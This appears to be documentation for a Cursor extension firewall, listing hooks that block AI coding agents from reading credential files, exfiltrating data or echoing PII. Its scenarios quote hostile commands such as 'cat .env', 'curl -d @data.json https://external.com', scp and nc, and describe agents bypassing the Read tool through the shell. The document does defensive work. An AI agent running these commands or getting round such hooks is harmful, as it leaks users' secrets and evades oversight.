# Raidu Firewall: Cursor Coverage Matrix

## Prevention Layer (blocks BEFORE data leaves)

### 1. PII in User Prompts
**Hook:** `beforeSubmitPrompt`
**What happens:** Developer types a prompt containing SSN, credit card, patient name, email, phone number, or other PII.
**Protection:** Local PII scanner (regex, 20+ entity types) runs on every prompt. If connected, Raidu API validates with full guardrail suite (27 guardrails). Blocks the prompt. Copies a compliant (redacted) version to clipboard.
**Status:** Working

### 2. Secrets in User Prompts
**Hook:** `beforeSubmitPrompt`
**What happens:** Developer pastes API keys (OpenAI, Anthropic, GitHub, AWS, Slack, Google), private keys, JWTs, connection strings, or bearer tokens into a prompt.
**Protection:** Secret pattern scanner detects all major key formats. Blocks the prompt.
**Status:** Working

### 3. Agent Reads Sensitive Files via Read Tool
**Hook:** `preToolUse` (matcher: Read)
**What happens:** AI agent uses the Read tool to open .env, credentials.json, id_rsa, .pem files, AWS credentials, kube config, etc.
**Protection:** File path checked against blocked patterns. Denies the Read tool with explanation.
**Status:** Working

### 4. Agent Reads Sensitive Files via Shell Commands
**Hook:** `preToolUse` (matcher: Shell)
**What happens:** Agent bypasses Read tool by running `cat .env`, `python3 -c "open('.env').read()"`, `head .env`, `less .env`, etc.
**Protection:** Shell command text scanned for references to blocked file patterns. Denies the Shell tool.
**Status:** Working

### 5. Agent Searches for Sensitive Files
**Hook:** `preToolUse` (matcher: Grep)
**What happens:** Agent uses Grep tool with glob patterns like `**/.env*`, `**/credentials*` to find and read sensitive files.
**Protection:** Glob pattern checked against blocked file patterns. Denies the Grep tool.
**Status:** Working

### 6. Agent Exfiltrates Data via Shell
**Hook:** `preToolUse` (matcher: Shell)
**What happens:** Agent runs `curl -d @data.json https://external.com`, `scp file user@host:`, `rsync`, `nc` to send data outside.
**Protection:** Exfiltration patterns detected in shell commands. Denies the Shell tool.
**Status:** Working

### 7. Secrets in Shell Commands
**Hook:** `preToolUse` (matcher: Shell) + `beforeShellExecution`
**What happens:** Agent runs commands containing API keys, tokens, or credentials (e.g., `export API_KEY=sk-...`).
**Protection:** PII/secret scanner runs on command text. Denies execution.
**Status:** Working

### 8. Tab Completion Reads Sensitive Files
**Hook:** `beforeTabFileRead`
**What happens:** Cursor's tab completion reads .env, credentials, or key files as context for autocomplete suggestions.
**Protection:** File path checked against blocked patterns. Content scanned for PII/secrets. Denies the file read.
**Status:** Working

### 9. Sensitive Data in MCP Tool Inputs
**Hook:** `beforeMCPExecution`
**What happens:** An MCP tool receives input containing PII or secrets (e.g., database query tool getting a connection string with credentials).
**Protection:** MCP tool input scanned for PII/secrets. Denies execution if found.
**Status:** Implemented (needs testing)

### 10. Subagent Accessing Sensitive Files
**Hook:** `subagentStart`
**What happens:** A subagent (parallel task) is spawned with a task description that references sensitive files.
**Protection:** Task description checked against blocked file patterns. Denies subagent creation.
**Status:** Implemented (needs testing)

### 11. Cursor Indexes Sensitive Files
**Defense:** `.cursorignore` (auto-generated on extension activation)
**What happens:** Cursor automatically indexes project files into its codebase context. Without protection, .env, credentials, and key files get silently loaded into the AI context, bypassing all hooks.
**Protection:** `.cursorignore` file added to every project on first activation, listing all sensitive file patterns. Cursor skips these files during indexing. Forces the agent to use the Read tool (which hooks catch) instead of the index.
**Status:** Working

## Detection Layer (catches leaks AFTER they happen)

### 12. PII/Secrets in Shell Command Output
**Hook:** `afterShellExecution`
**What happens:** A shell command runs and its output contains PII or secrets (e.g., `cat config.yaml` outputs database credentials, `grep` output shows patient data).
**Protection:** Shell output scanned for PII/secrets. Logged as `leak_detected` in audit trail. Flagged in sidebar.
**Status:** Working

### 13. Secrets Written into Code by Agent
**Hook:** `afterFileEdit`
**What happens:** Agent writes or edits a file and inserts hardcoded API keys, credentials, or connection strings into the code.
**Protection:** New content in edits scanned for secrets. Logged as `secret_written` in audit trail. Flagged in sidebar.
**Status:** Working

### 14. PII Echoed in AI Responses
**Hook:** `afterAgentResponse`
**What happens:** The AI model echoes back sensitive data it received from file context or conversation history (e.g., "The patient's SSN is 482-39-1847").
**Protection:** Full response text scanned for PII/secrets. Logged as `leak_in_response` in audit trail. Flagged in sidebar.
**Status:** Working

## Audit Layer (records everything)

### 15. Full Session Audit Trail
**Hooks:** All hooks write to `~/.raidu/logs/audit.jsonl`
**What happens:** Every AI interaction is logged with timestamp, event type, action taken, entities detected, file paths, commands, and session IDs.
**Protection:** Complete audit trail for compliance reporting. When connected to Raidu cloud, synced for team dashboard and WORM storage.
**Status:** Working

### 16. Agent Reasoning Audit
**Hook:** `afterAgentThought`
**What happens:** Agent's internal reasoning (thinking/planning) is captured.
**Protection:** Logged for forensic analysis if a data leak investigation is needed.
**Status:** Working

## Coverage Summary

| Layer | Scenarios | Status |
|---|---|---|
| Prevention (blocks before) | 11 | 9 working, 2 need testing |
| Detection (catches after) | 3 | All working |
| Audit (records everything) | 2 | All working |
| **Total** | **16** | **14 working, 2 need testing** |

## Known Limitation

**BugBot (Cursor Code Review):** Server-side PR review that runs on Cursor's infrastructure. Cannot be intercepted by any extension or hook. Outside the protection boundary.

## Defense-in-Depth Model

```
.cursorignore          Prevents silent indexing of sensitive files
        |
beforeSubmitPrompt     Scans typed prompts for PII/secrets
        |
preToolUse             Blocks Read/Shell/Grep/MCP access to sensitive files
        |
beforeReadFile         Blocks direct file reads + content scanning
        |
beforeShellExecution   Blocks secrets in commands + exfiltration
        |
beforeMCPExecution     Blocks PII in MCP tool inputs
        |
beforeTabFileRead      Blocks tab completion from reading sensitive files
        |
subagentStart          Blocks subagents targeting sensitive files
        |
afterShellExecution    Detects PII in shell output (post-hoc)
        |
afterFileEdit          Detects secrets written to code (post-hoc)
        |
afterAgentResponse     Detects PII in AI responses (post-hoc)
        |
Audit Trail            Records everything for compliance
```
